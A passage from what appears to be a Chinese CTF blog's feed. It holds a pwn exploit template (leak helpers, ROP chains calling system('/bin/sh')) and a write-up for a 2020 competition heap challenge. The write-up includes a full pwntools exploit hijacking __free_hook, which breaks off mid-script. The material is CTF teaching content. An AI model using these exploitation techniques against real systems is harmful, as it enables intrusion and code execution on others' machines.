        <content type="html"><![CDATA[<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><h3 id="脚本的开始"><a href="#脚本的开始" class="headerlink" title="脚本的开始"></a>脚本的开始</h3><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605108280066.png" alt="大纲图"></p><pre class=" language-python"><code class="language-python">file_path <span class="token operator">=</span> <span class="token string">"./blend_pwn"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span></code></pre><h2 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h2><h3 id="用来调试开启PIE的程序"><a href="#用来调试开启PIE的程序" class="headerlink" title="用来调试开启PIE的程序"></a>用来调试开启PIE的程序</h3><p>能得到pie的地址运行一些gdb命令</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>         <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span> debug_1<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x000000000000117C</span><span class="token punctuation">,</span><span class="token number">0x00000000000011B8</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h2><h3 id="用来泄露堆里面的地址-待改进为可以泄露两个"><a href="#用来泄露堆里面的地址-待改进为可以泄露两个" class="headerlink" title="用来泄露堆里面的地址(待改进为可以泄露两个)"></a>用来泄露堆里面的地址(待改进为可以泄露两个)</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak_result</span><span class="token punctuation">(</span>until<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>until<span class="token punctuation">)</span>    info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>    result<span class="token operator">=</span>u64<span class="token punctuation">(</span>info<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resultnew_node<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x61</span><span class="token punctuation">)</span>new_node<span class="token punctuation">(</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x61</span><span class="token punctuation">)</span>delete_node<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete_node<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show_node<span class="token punctuation">(</span><span class="token punctuation">)</span>leak_result<span class="token punctuation">(</span><span class="token string">"index 1:"</span><span class="token punctuation">)</span></code></pre><h3 id="泄露格式化字符串-可以同时泄露多个-因为里面直接用recv-会一下接收全部的回应可能会让下一次new阻塞"><a href="#泄露格式化字符串-可以同时泄露多个-因为里面直接用recv-会一下接收全部的回应可能会让下一次new阻塞" class="headerlink" title="泄露格式化字符串(可以同时泄露多个),因为里面直接用recv()会一下接收全部的回应可能会让下一次new阻塞"></a>泄露格式化字符串(可以同时泄露多个),因为里面直接用recv()会一下接收全部的回应可能会让下一次new阻塞</h3><p>输入的payload为%p%p格式</p><ul><li>spli为要进行切割的字符串</li><li>length为要每一段要保留的长度(如果是libc的地址6个字节,需要的长度为12)</li><li>需要先查看输出再决定保留哪一部分</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 列表字符串转int,包含一个输出</span><span class="token keyword">def</span> <span class="token function">get_int</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    content<span class="token operator">=</span><span class="token punctuation">[</span>int<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">]</span>    out<span class="token operator">=</span><span class="token punctuation">[</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"content to int end is : "</span><span class="token punctuation">,</span>out<span class="token punctuation">)</span>    <span class="token keyword">return</span> content<span class="token keyword">def</span> <span class="token function">get_formate_result</span><span class="token punctuation">(</span>spli<span class="token operator">=</span><span class="token string">"0x"</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    info<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>info<span class="token punctuation">.</span>split<span class="token punctuation">(</span>spli<span class="token punctuation">)</span>    info<span class="token operator">=</span><span class="token punctuation">[</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>length<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> info<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak info (may set a and b to get real info) : "</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span>    <span class="token keyword">return</span> infosend_name<span class="token punctuation">(</span><span class="token string">"%p-%p"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#中间长度不够12的元素将会被舍弃</span>show_name<span class="token punctuation">(</span><span class="token punctuation">)</span>info<span class="token operator">=</span>get_formate_result<span class="token punctuation">(</span><span class="token punctuation">)</span>info<span class="token operator">=</span>get_int<span class="token punctuation">(</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>输出结果为<span class="token punctuation">(</span><span class="token string">'leak info (may set a and b to get real info) : '</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'Current user'</span><span class="token punctuation">,</span> <span class="token string">'7ffc95a046f0'</span><span class="token punctuation">,</span> <span class="token string">'7f409df8a780'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'content to int end is : '</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'0x7ffc95a046f0'</span><span class="token punctuation">,</span> <span class="token string">'0x7f409df8a780'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><h3 id="常用rop-待添加如ret2dl的-栈迁移的等"><a href="#常用rop-待添加如ret2dl的-栈迁移的等" class="headerlink" title="常用rop(待添加如ret2dl的,栈迁移的等)"></a>常用rop(待添加如ret2dl的,栈迁移的等)</h3><h4 id="泄露puts函数got表"><a href="#泄露puts函数got表" class="headerlink" title="泄露puts函数got表"></a>泄露puts函数got表</h4><pre class=" language-python"><code class="language-python">p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>下一次返回的地址<span class="token punctuation">)</span></code></pre><h4 id="调用system-“-bin-sh”"><a href="#调用system-“-bin-sh”" class="headerlink" title="调用system(“/bin/sh”)"></a>调用system(“/bin/sh”)</h4><pre class=" language-python"><code class="language-python">p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="计算方法"><a href="#计算方法" class="headerlink" title="计算方法"></a>计算方法</h2><h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>泄露-目的=偏移——&gt;目的=泄露-偏移<br>例:</p><pre class=" language-python"><code class="language-python">泄露libc地址<span class="token operator">-</span>vmmap得出来的libc基地址<span class="token operator">>></span><span class="token operator">></span> hex<span class="token punctuation">(</span><span class="token number">0x7f5f30f3d780</span><span class="token operator">-</span><span class="token number">0x7f5f30b77000</span><span class="token punctuation">)</span><span class="token string">'0x3c6780'</span>写在脚本里的是libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak<span class="token number">-0x3c6780</span></code></pre><p>libc上的地址也可以直接用vmmap 得出,但是栈的地址只能用上面的方法计算出来</p><pre class=" language-python"><code class="language-python">pwndbg<span class="token operator">></span> vmmap <span class="token number">0x7f5f3086e000</span><span class="token operator">+</span><span class="token number">0x50</span>LEGEND<span class="token punctuation">:</span> STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA    <span class="token number">0x7f5f3086e000</span>     <span class="token number">0x7f5f30976000</span> r<span class="token operator">-</span>xp   <span class="token number">108000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libm<span class="token number">-2.23</span><span class="token punctuation">.</span>so <span class="token operator">+</span><span class="token number">0x50</span></code></pre><h2 id="关注漏洞点"><a href="#关注漏洞点" class="headerlink" title="关注漏洞点"></a>关注漏洞点</h2><ul><li>索引越界，所有对连续内存元素的存取都要有限制</li><li>如果索引为负数有没有限制,索引是否为无符号数</li><li>释放后指针有没有清零</li><li>定义的read函数有没有溢出，NULL byte溢出，一字节溢出，\n溢出</li><li>如果size为0,malloc的结果和read的结果</li><li>格式化字符串漏洞</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 技巧 </tag>
            
            <tag> 模板 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020全国电信和互联网行业网络安全管理职业技能竞赛pwn-WP</title>
      <link href="2020/11/10/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/"/>
      <url>2020/11/10/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>自己只做了pwn2，就从pwn2开始</p><p>c++用于输入输出,主要逻辑是用c实现的。因为会调用c++的库，这里涉及到一些库的库的加载。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836235597.png" alt="add"></p><p>当进行add的时候如果size为0将会成功申请空间</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836644128.png" alt="edit"></p><p>在edit的时候如果size为0可以无限制的获取输入，造成了堆溢出。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>1.libc2.27需要填满tcach然后泄露libc地址。但是这里泄露出来的libc如下图，泄露出来的是第二条线的地址，实际上需要的是第一条线的地址，实际上这几部分是同一个库，相对的偏移都是固定的。</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836598126.png" alt="加载"></p><ul><li>2.用fastbin attack劫持__malloc_hook，2.27使得可以申请到任何一段空间不需要size的限制。实际上__malloc_hook劫持成one_gatget这里不行。实际用system函数劫持__free_hook</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836619586.png" alt="free_hook"></p><p>这里有一个问题：__free_hook看到的地址是在data区域,但是pwntools的symbols还是获取到了正确的偏移。</p><ul><li>3.保存点小技巧：</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  debug_str <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>    text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>      debug_str<span class="token operator">+=</span><span class="token string">'x /10xg {}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>      debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span></code></pre><p>可以很方便调试开启了PIE的程序，把命令改掉可以换成下断点</p><p> Ubuntu18使用fastbin attack是直接把fd指针指向要修改的地址就好</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># _*_ coding:utf-8 _*_</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># context.terminal=['tmux', 'splitw', '-h']</span>prog <span class="token operator">=</span> <span class="token string">'./noteplus'</span><span class="token comment" spellcheck="true"># #elf = ELF(prog)</span><span class="token comment" spellcheck="true"># # p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})</span><span class="token comment" spellcheck="true"># libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")</span><span class="token comment" spellcheck="true"># p = remote("121.36.245.213", 23333)</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span>local<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">from</span> one_gadget <span class="token keyword">import</span> generate_one_gadget<span class="token keyword">if</span> local<span class="token punctuation">:</span>    path_to_libc <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>    one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f3d5</span><span class="token punctuation">,</span><span class="token number">0x4f432</span><span class="token punctuation">,</span><span class="token number">0x10a41c</span><span class="token punctuation">]</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span>prog<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x10a45c</span><span class="token punctuation">,</span> <span class="token number">0x4f3c2</span><span class="token punctuation">,</span> <span class="token number">0x4f365</span><span class="token punctuation">]</span>    p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"121.36.245.213"</span><span class="token punctuation">,</span> <span class="token number">23333</span><span class="token punctuation">)</span>    path_to_libc<span class="token operator">=</span><span class="token string">"/media/tower/data/work/ctf/dianxin/pwn2/460f7fe9177846df879863c485e2940b/libc-2.27.so"</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span>path_to_libc<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token keyword">def</span> <span class="token function">one_gadget_list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> offset <span class="token keyword">in</span> generate_one_gadget<span class="token punctuation">(</span>path_to_libc<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>        one<span class="token punctuation">.</span>append<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    <span class="token keyword">return</span> one<span class="token comment" spellcheck="true"># one=one_gadget_list()</span><span class="token comment" spellcheck="true"># p = process(["/glibc/2.27/64/lib/ld-2.27.so", "./pwn"], env={"LD_PRELOAD": "/glibc/2.27/64/lib/libc.so.6"})</span><span class="token comment" spellcheck="true"># p = process(["./libc-2.27.so", "./noteplus"], env={"LD_PRELOAD": "./libc-2.27.so"})</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  debug_str <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>    text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>      debug_str<span class="token operator">+=</span><span class="token string">'x /10xg {}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>      debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">New</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"ize: "</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">View</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our choice: "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">,</span>index<span class="token punctuation">)</span>index<span class="token operator">=</span><span class="token number">0x8</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    New<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>index<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>View<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>libc_content<span class="token operator">=</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>libc_content<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xb78</span><span class="token operator">-</span><span class="token number">0x1b8</span><span class="token operator">-</span><span class="token number">0x3eb000</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>Delete<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token punctuation">)</span>New<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token 